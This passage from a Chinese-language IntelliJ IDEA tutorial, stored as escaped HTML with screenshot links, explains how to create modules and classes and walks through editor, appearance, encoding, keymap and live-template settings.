&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQXrB.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;com.atguigu.java&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQmi6.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;在包下 New 一个 Java Class：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQYh3.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;HelloWorld&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQ0NK.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;不管是创建 Class，还是 Interface，还是 Annotation，都是选择 New --&amp;gt; Java Class，然后在 Kind 下拉框中选择创建的结构的类型。接着在类 HelloWorld 里声明主方法，输出 Hello World!，完成测试。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQdbn.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;code&gt;说明&lt;/code&gt;：在 IDEA 里要说的是，写完代码，不用点击保存。IDEA 会自动保存代码。
&lt;h3 id=&quot;h5module&quot;&gt;&lt;span&gt;&lt;strong&gt;5. 创建模块(Module)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;1、在 Eclipse 中我们有 workspace（工作空间）和 Project（工程）的概念，在 IDEA 中只有 Project（工程）和 Module（模块）的概念。这里的对应关系为：&lt;br/&gt;IDEA 官网说明：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs vbnet&quot;&gt;An Eclipse workspace &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; similar &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; a project &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; IntelliJ IDEA &lt;br/&gt;An Eclipse project maps &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; a &lt;span class=&quot;hljs-keyword&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; IntelliJ IDEA&lt;br/&gt;翻译：&lt;br/&gt;Eclipse 中 workspace 相当于 IDEA 中的 Project&lt;br/&gt;Eclipse 中 Project 相当于 IDEA 中的 &lt;span class=&quot;hljs-keyword&quot;&gt;Module&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个地方刚开始用的时候会很容易理不清它们之间的关系。&lt;br/&gt;2、从 Eclipse 转过来的人总是下意识地要在同一个窗口管理 n 个项目，这在 IntelliJ IDEA 是无法做到的。IntelliJ IDEA 提供的解决方案是打开多个项目实例，即打开多个项目窗口。即：一个 Project 打开一个 Window 窗口。&lt;br/&gt;3、在 IntelliJ IDEA 中 Project 是最顶级的级别，次级别是 Module。一个 Project 可以有多个 Module。目前主流的大型项目都是分布式部署的，结构都是类似这种多 Module 结构。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQjKE.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;这类项目一般是这样划分的，比如：core Module、web Module、plugin Module、solr Module 等等，模块之间彼此可以相互依赖。通过这些 Module 的命名也可以看出，他们之间都是处于同一个项目业务下的模块，彼此之间是有不可分割的业务关系的。举例：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQbra.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;4、相比较于多 Module 项目，小项目就无需搞得这么复杂。只有一个 Module 的结构 IntelliJ IDEA 也是支持的，并且 IntelliJ IDEA 创建项目的时候，默认就是单 Module 的结构的。&lt;br/&gt;下面，我们演示如何创建 Module:&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQGoQ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【Next】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQOW2.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;给模块起名字和保存的位置&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQ4hh.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;之后，我们可以在 Module 的 src 里写代码，此时 Project01 工程下的 src 就没什么&lt;br/&gt;用了。可以删掉。&lt;br/&gt;5、演示创建类的同时创建包&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQpxz.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;包名小写，类名大写&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQumS.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;效果如下图：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQJkH.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;6、如何删除模块&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQhDN.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;选中要删除的模块，点击减号&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQvpu.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【Yes】后，点击【Ok】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQy19.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;此时再选中要删除的模块会出现有【Delete】选项，会从硬盘上将此 Module 删除掉&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQcdO.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;7、查看项目配置&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQPoA.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;进入项目结构：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQrrq.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;h-1&quot;&gt;&lt;span&gt;&lt;strong&gt;五、常用配置&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;IntelliJ IDEA 有很多人性化的设置我们必须单独拿出来讲解，也因为这些人性化的设置让那些 IntelliJ IDEA 死忠粉更加死心塌地使用它和分享它。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;进入设置界面：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQCxe.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;目录结构如下：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQLzd.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h1appearancebehavior&quot;&gt;&lt;span&gt;&lt;strong&gt;1. Appearance &amp;amp; Behavior&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h11&quot;&gt;&lt;span&gt;&lt;strong&gt;1.1 设置主题&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;这里默认提供了三套主题：Darcula，High contrast和IntelliJ。这里可以根据自己的喜好进行选择。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQehR.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h12&quot;&gt;&lt;span&gt;&lt;strong&gt;1.2 设置窗体及菜单的字体及字体大小(可忽略)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQkCJ.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h13&quot;&gt;&lt;span&gt;&lt;strong&gt;1.3 补充:设置编辑区主题(可忽略)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;IDEA 默认提供了三个编辑区主题，可以通过如下的方式进行选择。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQ6qX.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;如果想要更多的主题效果的话，可以到如下的网站下载：&lt;br/&gt;http://www.riaway.com/
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;下载以后，导入主题：（方式一）&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;File –&amp;gt; Import Setttings –&amp;gt; 选中下载的主题 jar 文件 –&amp;gt; 一路确认 –&amp;gt; 重启IDEA。&lt;br/&gt;重启以后，新主题会自动启用。如果没有启用，可以如下方式选择：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;下载以后，导入主题：（方式二）&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQt1y.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h14plugins&quot;&gt;&lt;span&gt;&lt;strong&gt;1.4 补充：通过插件(Plugins)更换主题&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;喜欢黑色主题的话，还可以下载插件：Material Theme UI&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQNdl.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击按钮以后，在联网环境下搜索如上的插件安 -&amp;gt; 装 -&amp;gt; 重启IDEA 即可。&lt;br/&gt;如果对安装的主题插件不满意，还可以找到此插件，进行卸载 -&amp;gt; 重启IDEA 即可。
&lt;h3 id=&quot;h2editorgeneral&quot;&gt;&lt;span&gt;&lt;strong&gt;2. Editor -&amp;gt; General&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h21&quot;&gt;&lt;span&gt;&lt;strong&gt;2.1 设置鼠标滚轮修改字体大小(可忽略)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQl2B.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;我们可以勾选此设置后，增加【Ctrl + 鼠标滚轮】快捷键来控制代码字体大小显示。
&lt;h4 id=&quot;h22&quot;&gt;&lt;span&gt;&lt;strong&gt;2.2 设置鼠标悬浮提示&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQSz6.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h23&quot;&gt;&lt;span&gt;&lt;strong&gt;2.3 设置自动导包功能&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQil3.png&quot; alt=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;Add unambiguous imports on the fly：自动导入不明确的结构&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Optimize imports on the fly：自动帮我们优化导入的包&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;h24&quot;&gt;&lt;span&gt;&lt;strong&gt;2.4 设置显示行号和方法间的分隔符&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQfvp.png&quot; alt=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;如上图红圈所示，可以勾选 Show line numbers：显示行数。我建议一般这个要勾选上。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;如上图红圈所示，可以勾选 Show method separators：显示方法分隔线。这种线有助于我们区分开方法，所以建议勾选上。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;h25&quot;&gt;&lt;span&gt;&lt;strong&gt;2.5 设置忽略大小写提示&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQ2BK.png&quot; alt=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;IntelliJ IDEA 的代码提示和补充功能有一个特性：区分大小写。如上图标注所示，默认就是 First letter only 区分大小写的。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;区分大小写的情况是这样的：比如我们在 Java 代码文件中输入 stringBuffer，IntelliJ IDEA - 默认是不会帮我们提示或是代码补充的，但是如果我们输入StringBuffer 就可以进行代码提示和补充。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;如果想不区分大小写的话，取消勾选该选项即可。（2017版本的IEDA中是改为 None 选项）&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;h26tabs&quot;&gt;&lt;span&gt;&lt;strong&gt;2.6 设置取消单行显示 tabs 的操作&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQ7sG.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;如上图标注所示，在打开很多文件的时候，IntelliJ IDEA 默认是把所有打开的文件名以 Tab 单行显示的。但是我个人现在的习惯是使用多行，多行效率比单行高，因为单行会隐藏超过界面部分 Tab，这样找文件不方便。
&lt;h3 id=&quot;h3editorfont&quot;&gt;&lt;span&gt;&lt;strong&gt;3. Editor –&amp;gt; Font&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h31&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1 设置默认的字体、字体大小、字体行间距&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQgqE.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h4editorcolorscheme&quot;&gt;&lt;span&gt;&lt;strong&gt;4. Editor –&amp;gt; Color Scheme&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h41&quot;&gt;&lt;span&gt;&lt;strong&gt;4.1 修改当前主题的字体、字体大小、字体行间距(可忽略)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;如果当前主题不希望使用默认字体、字体大小、字体行间距，还可以单独设置：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQR1n.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h42&quot;&gt;&lt;span&gt;&lt;strong&gt;4.2 修改当前主题的控制台输出的字体及字体大小(可忽略)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQojQ.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h43&quot;&gt;&lt;span&gt;&lt;strong&gt;4.3 修改代码中注释的字体颜色&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQqC2.png&quot; alt=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;Doc Comment –&amp;gt; Text：修改文档注释的字体颜色&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Block comment：修改多行注释的字体颜色&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Line comment：修改当行注释的字体颜色&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;h5editorcodestyle&quot;&gt;&lt;span&gt;&lt;strong&gt;5. Editor –&amp;gt; Code Style&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h51import&quot;&gt;&lt;span&gt;&lt;strong&gt;5.1 设置超过指定 import 个数，改为* (可忽略)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQw2a.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h6editorfileandcodetemplates&quot;&gt;&lt;span&gt;&lt;strong&gt;6. Editor –&amp;gt; File and Code Templates&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h61&quot;&gt;&lt;span&gt;&lt;strong&gt;6.1 修改类头的文档注释信息&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jW5Vz.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;常用的预设的变量，这里直接贴出官网给的：
&lt;pre&gt;
&lt;code class=&quot;hljs vbscript&quot;&gt;${PACKAGE_NAME}     name of the package &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; which the &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; file &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; created&lt;br/&gt;${USER}             current user system login name&lt;br/&gt;${&lt;span class=&quot;hljs-built_in&quot;&gt;DATE&lt;/span&gt;}             current system &lt;span class=&quot;hljs-built_in&quot;&gt;date&lt;/span&gt;&lt;br/&gt;${&lt;span class=&quot;hljs-built_in&quot;&gt;TIME&lt;/span&gt;}             current system &lt;span class=&quot;hljs-built_in&quot;&gt;time&lt;/span&gt;&lt;br/&gt;${&lt;span class=&quot;hljs-built_in&quot;&gt;YEAR&lt;/span&gt;}             current &lt;span class=&quot;hljs-built_in&quot;&gt;year&lt;/span&gt;&lt;br/&gt;${&lt;span class=&quot;hljs-built_in&quot;&gt;MONTH&lt;/span&gt;}            current &lt;span class=&quot;hljs-built_in&quot;&gt;month&lt;/span&gt;&lt;br/&gt;${MONTH_NAME_SHORT} first &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt; letters of the current &lt;span class=&quot;hljs-built_in&quot;&gt;month&lt;/span&gt; name. Example: Jan, Feb, etc.&lt;br/&gt;${MONTH_NAME_FULL}  full name of the current &lt;span class=&quot;hljs-built_in&quot;&gt;month&lt;/span&gt;. Example: January, February, etc.&lt;br/&gt;${&lt;span class=&quot;hljs-built_in&quot;&gt;DAY&lt;/span&gt;}              current &lt;span class=&quot;hljs-built_in&quot;&gt;day&lt;/span&gt; of the &lt;span class=&quot;hljs-built_in&quot;&gt;month&lt;/span&gt;&lt;br/&gt;${DAY_NAME_SHORT}   first &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt; letters of the current &lt;span class=&quot;hljs-built_in&quot;&gt;day&lt;/span&gt; name. Example: Mon, Tue, etc.&lt;br/&gt;${DAY_NAME_FULL}    full name of the current &lt;span class=&quot;hljs-built_in&quot;&gt;day&lt;/span&gt;. Example: Monday, Tuesday, etc.&lt;br/&gt;${&lt;span class=&quot;hljs-built_in&quot;&gt;HOUR&lt;/span&gt;}             current &lt;span class=&quot;hljs-built_in&quot;&gt;hour&lt;/span&gt;&lt;br/&gt;${&lt;span class=&quot;hljs-built_in&quot;&gt;MINUTE&lt;/span&gt;}           current &lt;span class=&quot;hljs-built_in&quot;&gt;minute&lt;/span&gt;&lt;br/&gt;${PROJECT_NAME}     the name of the current project&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h7editorfileencodings&quot;&gt;&lt;span&gt;&lt;strong&gt;7. Editor –&amp;gt; File Encodings&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h71&quot;&gt;&lt;span&gt;&lt;strong&gt;7.1 设置项目文件编码&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jW9vS.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h72&quot;&gt;&lt;span&gt;&lt;strong&gt;7.2 设置当前源文件的编码(可忽略)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;打开某一个文件，在右下角&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWDlh.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;出现如下图选项：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWFFH.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;对单独文件的编码修改还可以点击右下角的编码设置区。如果代码内容中包含中文，则会弹出如上的操作选择。其中：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;①Reload 表示使用新编码重新加载，新编码不会保存到文件中，重新打开此文件，旧编码是什么依旧还是什么。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;②Convert 表示使用新编码进行转换，新编码会保存到文件中，重新打开此文件，新编码是什么则是什么。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;③含有中文的代码文件，Convert 之后可能会使中文变成乱码，所以在转换成请做好备份，不然可能出现转换过程变成乱码，无法还原。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;h8buildexecutiondeployment&quot;&gt;&lt;span&gt;&lt;strong&gt;8. Build,Execution,Deployment&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h81&quot;&gt;&lt;span&gt;&lt;strong&gt;8.1 设置自动编译&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWTAu.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;构建就是以我们编写的 java 代码、框架配置文件、国际化等其他资源文件、JSP 页面和图片等资源作为“原材料”，去“生产”出一个可以运行的项目的过程。&lt;br/&gt;Intellij Idea 默认状态为不自动编译状态，Eclipse 默认为自动编译，如下图所示：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWHsN.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;很多朋友都是从 Eclipse 转到 Intellij 的，这常常导致我们在需要操作 class 文件时忘记对修改后的 java 类文件进行重新编译，从而对旧文件进行了操作。
&lt;h3 id=&quot;h9&quot;&gt;&lt;span&gt;&lt;strong&gt;9. 设置为省电模式 (可忽略)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWXw9.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;如上图所示，IntelliJ IDEA 有一种叫做 &lt;code&gt;省电模式&lt;/code&gt; 的状态，开启这种模式之后 IntelliJ IDEA 会关掉代码检查和代码提示等功能。所以一般也可认为这是一种 &lt;code&gt;阅读模式&lt;/code&gt;，如果你在开发过程中遇到突然代码文件不能进行检查和提示，可以来看看这里是否有开启该功能。
&lt;h3 id=&quot;h10&quot;&gt;&lt;span&gt;&lt;strong&gt;10. 设置代码水平或垂直显示&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWVEO.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;hkeymap&quot;&gt;&lt;span&gt;&lt;strong&gt;六、设置快捷键(Keymap)&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1eclipse&quot;&gt;&lt;span&gt;&lt;strong&gt;1. 设置快捷为 Eclipse 的快捷键&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWzjA.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h2-3&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 通过快捷键功能修改快捷键设置&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWWyd.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h3-3&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 通过指定快捷键，查看或修改其功能&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWdlR.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h4-2&quot;&gt;&lt;span&gt;&lt;strong&gt;4. 导入已有设置的快捷键&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWY2q.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;选择配置好的快捷键jar的位置，点击【0K】之后，重启 IDEA 即可。
&lt;h3 id=&quot;h5-1&quot;&gt;&lt;span&gt;&lt;strong&gt;5. 常用快捷键&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWQVe.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;htemplates&quot;&gt;&lt;span&gt;&lt;strong&gt;七、关于模板(Templates)&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;　　(Editor –&amp;gt; Live Templates 和 Editor –&amp;gt; General –&amp;gt; Postfix Completion)&lt;/p&gt;
&lt;h3 id=&quot;h1livetemplates&quot;&gt;&lt;span&gt;&lt;strong&gt;1. Live Templates(实时代码模板)功能介绍&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;它的原理就是配置一些常用代码字母缩写，在输入简写时可以出现你预定义的固定模式的代码，使得开发效率大大提高，同时也可以增加个性化。最简单的例子就是在 Java 中输入 sout 会出现 System.out.println();&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;官方介绍 Live Templates：https://www.jetbrains.com/help/idea/using-live-templates.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;h2-4&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 已有的常用模板&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;Postfix Completion 默认如下：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWGFr.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;Live Templates 默认如下：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWMuY.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;二者的区别：Live Templates(实时代码模板) 可以自定义，而 Postfix Completion 不可以。同时，有些操作二者都提供了模板，Postfix Templates 较 Live Templates 能快 0.01 秒。&lt;br/&gt;举例：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;2.1 psvm：可生成 main 方法&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;2.2 sout：System.out.println() 快捷输出 类似的：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;soutp=System.out.println(&quot;方法形参名 = &quot; + 形参名);&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;soutv=System.out.println(&quot;变量名 = &quot; + 变量);&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;soutm=System.out.println(&quot;当前类名.当前方法&quot;);&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&quot;abc&quot;.sout =&amp;gt; System.out.println(&quot;abc&quot;);&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;2.3 fori：可生成 for 循环 类似的：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;iter：可生成增强 for 循环&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;itar：可生成普通 for 循环&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;2.4 list.for：可生成集合 list 的增强 for 循环 List list = new ArrayList(); 输入：list.for 即可输出 for (String s : list) { } 又如：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;list.fori 顺序遍历&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;list.forr 倒序遍历&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;2.5 ifn：可生成 if (xxx = null) 类似的：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;inn：可生成 if(xxx != null) 或 xxx.nn 或 xxx.null&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;2.6 prsf：可生成 private static final 类似的：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;psf：可生成 public static final&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;psfi：可生成 public static final int&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;psfs：可生成 public static final String&lt;/span&gt;&lt;/li&gt;
